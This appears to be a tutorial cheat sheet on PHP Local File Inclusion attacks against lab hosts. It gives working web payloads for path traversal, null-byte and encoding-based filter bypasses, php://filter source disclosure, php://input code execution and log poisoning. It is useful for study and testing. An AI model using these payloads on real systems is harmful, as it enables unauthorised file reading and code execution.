

<!--- category: lfi --->
<!--- id: intro --->
<!--- title: Local File Inclusion (LFI) --->
<!--- keywords:  --->
## Local File Inclusion (LFI)




<!--- category: lfi --->
<!--- id: LFI --->
<!--- title: LFI --->
<!--- keywords:  --->
## LFI

Many programming languages, such as php, are able to read files and process them to generate dynamic HTML pages.<br/>
This feature can be hijacked by user crafted variable.<br/>
 <br/>
For exemple:<br/>
The URI http://10.10.10.11/index.php?page=login.php is sent to the server.
The server receive the request extract the page field 'login.php' and process this file to generate the HTML login page.
 
Let replace 'login.php' by another file such as '/etc/passwd', that will be processed by php.
```
http://10.10.10.11/index.php?page=/etc/passwd
```
Php commands are enclosed between &lt;?php and ?> tags. When parsing a file without those tags, php simply print the file content.



<!--- category: lfi --->
<!--- id: FLI.. --->
<!--- title: LFI: Access / --->
<!--- keywords:  --->
## LFI: Access /

Apache web server working directory is usually /var/www/html.<br/>
Setting page=/etc/passwd, the server tries to open the file /var/www/html/etc/passwd. <br/>
Let add /../ to the path to reach the upper directory.<br/>

```
/var/www/html/../etc/passwd => /var/www/etc/passwd.
/var/www/html/../../etc/passwd => /var/etc/passwd.
```

We can add as many  ../../../../../ as we want, we can't go upper than /.<br/>
/var/www/html/../../../../../../../ => /, regardless of the number of ../<br/>

```
http://10.10.10.11?page=../../../../../etc/passwd
```

An LFI can read/execute ALL files, the web server account is allowed to read.



<!--- category: lfi --->
<!--- id: LFINull --->
<!--- title: NUll byte --->
<!--- keywords:  --->
## NUll byte

The server extracts 'page' parameter from request http://10.10.10.11/index.php?page=login, and appends an extension such as '.php' before including it.<br/>
<br/>
http://10.10.10.11/index.php?page=/etc/password tries without succes to open /etc/password.php.<br/>
<br/>
On php version older than 5.3.4, adding a null byte at the end of our parameter will mean the end of the string, and leads to ignoring the extension '.php'.<br/>
```
http://10.10.10.11/index.php?page=/etc/password%00
```




<!--- category: lfi --->
<!--- id: LFIURLDoubleEncodage --->
<!--- title: URL double encoding --->
<!--- keywords:  --->
## URL double encoding

```
<   %3C %253C
>   %3E %253E
«   %22 %2522
‘   %27 %2527
/   %2F %252F
.   %2E %252E
=   %3D %253D
–   %2D %252D
:   %3A %253A
```
    


<!--- category: lfi --->
<!--- id: LFIWaf --->
<!--- title: WAF: Web Application Filter --->
<!--- keywords:  --->
## WAF: Web Application Filter

Developers, who are aware of the risks of LFI, sometime add functions that will filter the entries.<br/>
They detect and remove the ../ and the / in the filename<br/>.
This kind of filter is called a Waf: Web Application Filter.<br/>
<br/>
It is possible to bypass these filters in several ways:<br/>
- By providing the sequences of characters that will be filtered out: ..././ once filtered becomes ../<br/>
http://10.10.10.11/index.php?page=..././..././..././..././passwd<br/>
 <br/>
- Using url encoding:<br/>
%2e%2e%2f instead of ../<br/>
%2f instead of /<br/>
http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br/>    
<br/>
- Using a double url encoding:<br/>
../ => %2e%2e%2f => %252e%252e%252f<br/>
http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword<br/>
<br/>

Browsers could interpret the encoded characters or even re-encode them. It is usually better to set the desired URL thanks to a curl command or modify/replay using an HTTP proxy.



<!--- category: lfi --->
<!--- id: LFIphpfilter --->
<!--- title: Php:filter: Get php sources --->
<!--- keywords:  --->
## Php:filter: Get php sources

Php allows to pass files through filters before opening them. It is thus possible to encode a file in base64 before opening it.
````
http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php 
http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php 
````
It only remains to decode base64 to get the source code of the file.



<!--- category: lfi --->
<!--- id: LFIphpinput --->
<!--- title: Php:input : Code injection in an HTTP Post --->
<!--- keywords:  --->
## Php:input : Code injection in an HTTP Post

Php allows to read the content of the HTTP request as a file. It is thus possible to read and execute the raw content of the data in POST with php://input.<br/>

curl  -X POST -d 'test=&lt;? system (&quot;id&quot;); ?>' http://pwnlab/?page=php://input<br/>

Only works if the option allow_url_include = On is active in the php config. This option is disabled by default.



<!--- category: lfi --->
<!--- id: FLILog --->
<!--- title: Logs Exploitation --->
<!--- keywords:  --->
## Logs Exploitation

To inject a Php payload in the log file of a server, just send an HTTP GET request containing php code in the url.<br/>
For an ssh or ftp server, inject the payload in login.
Use then an LFI on the log file to trigger the payload.<br/>
<br/>
Usual log files locations:<br/>
Apache<br/>
/var/log/apache/access.log<br/>
/var/log/apache/error.log<br/>
/usr/local/apache/log/error_log<br/>
/usr/local/apache2/log/error_log<br/>
/var/log/httpd/error_log<br/>
<br/>
Nginx<br/>
/var/log/nginx/access.log<br/>
/var/log/nginx/error.log<br/>
<br/>
Ssh<br/>
/var/log/sshd.log<br/>
<br/>
Log files location can be found in webservers config files:<br/>
Nginx: /etc/nginx/nginx.conf<br/>
Look for : access_log /spool/logs/nginx-access.log<br/>

